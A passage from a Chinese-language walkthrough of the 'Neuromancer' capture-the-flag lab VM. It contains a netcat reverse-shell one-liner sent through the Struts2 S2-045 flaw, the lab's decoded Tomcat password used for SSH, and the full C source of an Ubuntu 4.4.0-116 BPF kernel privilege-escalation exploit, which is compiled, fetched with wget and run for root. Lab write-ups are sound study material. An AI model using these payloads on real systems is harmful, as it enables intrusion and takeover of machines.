exploits/linux/webapps/41570.py</span><br><span class="line">Apache Struts 2.3.x Showcase - Remote Code Execution                                            | exploits/multiple/webapps/42324.py</span><br><span class="line">Apache Struts 2.5 &lt; 2.5.12 - REST Plugin XStream Remote Code Execution                          | exploits/linux/remote/42627.py</span><br><span class="line">Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploi | exploits/multiple/remote/41690.rb</span><br><span class="line">Apache Struts &lt; 2.2.0 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/17691.rb</span><br><span class="line">Apache Struts2 2.0.0 &lt; 2.3.15 - Prefixed Parameters OGNL Injection                              | exploits/multiple/webapps/44583.txt</span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>从github上面clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd24=">struts-pwn项目<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action --check</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] Status: Vulnerable!</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>
<p>表示存在CVE:2017-5638 - Apache Struts2 S2-045漏洞</p>
<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>然后运行下面命令获得一个revese shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> timeout=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<p>nc命令获得可交互的shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>成功的弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 55378</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">ta</span></span><br></pre></td></tr></table></figure>

<p>获得了Neuromancer的权限！检查“ta”用户的home目录将显示一些有趣的内容。此注释将显示tomcat目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ai-gui-guide.txt</span><br><span class="line">Application <span class="keyword">for</span> Neuromancer remote access interface includes:</span><br><span class="line"></span><br><span class="line">-Maven    - /opt/</span><br><span class="line">-Java jdk - /usr/lib/jvm/</span><br><span class="line">-Tomcat   - /usr/<span class="built_in">local</span>/tomcat/</span><br><span class="line">-Struts2  - /home/ta/myWebApp/</span><br><span class="line">          - war files are <span class="keyword">in</span> /root. Update these ASAP to improve security.</span><br><span class="line"></span><br><span class="line">Reduce installation of apps to ONLY what<span class="string">&#x27;s needed, seucure configurations and follow app security best practices.</span></span><br></pre></td></tr></table></figure>

<p>Tomcat将用户和密码存储在名为“tomcat-users.xml”的文件中。读取该文件将显示系统上另一个用户“lady3jane”的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>此外还可以通过struts 2漏洞利用工具来上传冰蝎木马来getshell :)</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub167.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub168.jpg"></p>
<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>将</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;gt;&amp;<span class="comment">#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;</span></span><br></pre></td></tr></table></figure>

<p>html编码解密得到：&gt;!Xx3JanexX!&lt;</p>
<p>然后使用：lady3jane/&gt;!Xx3JanexX!&lt;连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh lady3jane@192.168.56.110 -p 34483</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:21 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br></pre></td></tr></table></figure>

<p>现在，在lady3jane的主目录中，有一个文件可能每隔几分钟就会由cron执行一次。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Health check for Neuromancer (root) to execute every 3 minutes.</span></span><br><span class="line"><span class="comment"># ..the AI tells me it can maintain security, server health, etc w/o forced intervention,</span></span><br><span class="line"><span class="comment"># but I beg to differ...hence the cron script.</span></span><br><span class="line"></span><br><span class="line">&gt; /tmp/tomcat_status.log</span><br><span class="line"></span><br><span class="line">health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$health</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line">  *200*)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is Up&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is down&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>但是，无法利用这一点。看来这将永远不会被执行。因此，决定改用易受攻击的内核。可以找到所使用的内核漏洞的链接<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQyOTg=">Linux-Kernel-4-4-0-116-Ubuntu-16-04-4-LocalPrivilege-Escalation<i class="fa fa-external-link-alt"></i></span></p>
<p>来看一下内核提权的exp，很美。。。我何时才能达到这种水平呢？？？  :):):):):):):):):):):):)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat 44298.c </span></span><br><span class="line">/*</span><br><span class="line"> * Ubuntu 16.04.4 kernel priv esc</span><br><span class="line"> *</span><br><span class="line"> * all credits to @bleidl</span><br><span class="line"> * - vnik</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// Tested on:</span><br><span class="line">// 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line">// <span class="keyword">if</span> different kernel adjust CRED offset + check kernel stack size</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;errno.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/un.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="comment">#define CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="comment">#define UID_OFFSET 4</span></span><br><span class="line"><span class="comment">#define LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="comment">#define PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line">int sockets[2];</span><br><span class="line">int mapfd, progfd;</span><br><span class="line"></span><br><span class="line">char *__prog =  <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">char bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">static int bpf_prog_load(enum bpf_prog_type prog_type,</span><br><span class="line">                  const struct bpf_insn *insns, int prog_len,</span><br><span class="line">                  const char *license, int kern_version) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .prog_type = prog_type,</span><br><span class="line">                .insns = (__u64)insns,</span><br><span class="line">                .insn_cnt = prog_len / sizeof(struct bpf_insn),</span><br><span class="line">                .license = (__u64)license,</span><br><span class="line">                .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">                .log_size = LOG_BUF_SIZE,</span><br><span class="line">                .log_level = 1,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">        bpf_log_buf[0] = 0;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,</span><br><span class="line">                   int max_entries) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_type = map_type,</span><br><span class="line">                .key_size = key_size,</span><br><span class="line">                .value_size = value_size,</span><br><span class="line">                .max_entries = max_entries</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_update_elem(uint64_t key, uint64_t value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)&amp;key,</span><br><span class="line">                .value = (__u64)&amp;value,</span><br><span class="line">                .flags = 0,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_lookup_elem(void *key, void *value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)key,</span><br><span class="line">                .value = (__u64)value,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit(char *err) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void prep(void) &#123;</span><br><span class="line">        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);</span><br><span class="line">        <span class="keyword">if</span> (mapfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">                        (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, 0);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (progfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void writemsg(void) &#123;</span><br><span class="line">        char buffer[64];</span><br><span class="line"></span><br><span class="line">        ssize_t n = write(sockets[0], buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n &lt; 0) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">                <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n != sizeof(buffer))</span><br><span class="line">                fprintf(stderr, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define __update_elem(a, b, c) \</span></span><br><span class="line">        bpf_update_elem(0, (a)); \</span><br><span class="line">        bpf_update_elem(1, (b)); \</span><br><span class="line">        bpf_update_elem(2, (c)); \</span><br><span class="line">        writemsg();</span><br><span class="line"></span><br><span class="line">static uint64_t get_value(int key) &#123;</span><br><span class="line">        uint64_t value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __get_fp(void) &#123;</span><br><span class="line">        __update_elem(1, 0, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __read(uint64_t addr) &#123;</span><br><span class="line">        __update_elem(0, addr, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __write(uint64_t addr, uint64_t val) &#123;</span><br><span class="line">        __update_elem(2, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t get_sp(uint64_t addr) &#123;</span><br><span class="line">        <span class="built_in">return</span> addr &amp; ~(0x4000 - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void pwn(void) &#123;</span><br><span class="line">        uint64_t fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">        fp = __get_fp();</span><br><span class="line">        <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sp = get_sp(fp);</span><br><span class="line">        <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">        credptr = __read(task_struct + CRED_OFFSET); // cred</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uidptr = credptr + UID_OFFSET; // uid</span><br><span class="line">        <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">        __write(uidptr, 0); // <span class="built_in">set</span> both uid and gid to 0</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getuid() == 0) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">        prep();</span><br><span class="line">        pwn();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用下面的sed命令将c源文件的格式和缩进转换一下，以更好地编译exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 44298.c</span></span><br></pre></td></tr></table></figure>

<p>然后编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gcc 44298.c -o 44298</span></span><br></pre></td></tr></table></figure>

<p>最后下载到目标机上，赋予权限之后运行exp程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ wget http://192.168.56.102:8000/44298</span><br><span class="line">--2020-01-15 23:44:14--  http://192.168.56.102:8000/44298</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17888 (17K) [application/octet-stream]</span><br><span class="line">Saving to: ‘44298’</span><br><span class="line"></span><br><span class="line">44298                              100%[=============================================================&gt;]  17.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 23:44:14 (482 MB/s) - ‘44298’ saved [17888/17888]</span><br><span class="line"></span><br><span class="line">lady3jane@neuromancer:~$ chmod 777 *</span><br><span class="line">lady3jane@neuromancer:~$ ./44298</span><br><span class="line">task_struct = ffff88003cc93800</span><br><span class="line">uidptr = ffff88003579fd84</span><br><span class="line">spawning root shell</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(lady3jane)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，下面寻找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@neuromancer:~<span class="comment"># cd /root</span></span><br><span class="line">root@neuromancer:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt  struts2  velocity.log</span><br><span class="line">root@neuromancer:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub166.jpg"></p>
<p>不要太帅。。。</p>
<p>做一些成功利用后的枚举，发现确实有一个crontab配置为root来执行lady3jane的主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@neuromancer:/root<span class="comment"># crontab -l</span></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line                                                                               </span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run                                                                             </span></span><br><span class="line"><span class="comment"># and what command to run for the task                                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for                                                                                 </span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),                                                                                 </span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).#                                                                         </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system                                                                           </span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.                                                                                                 </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through                                                                          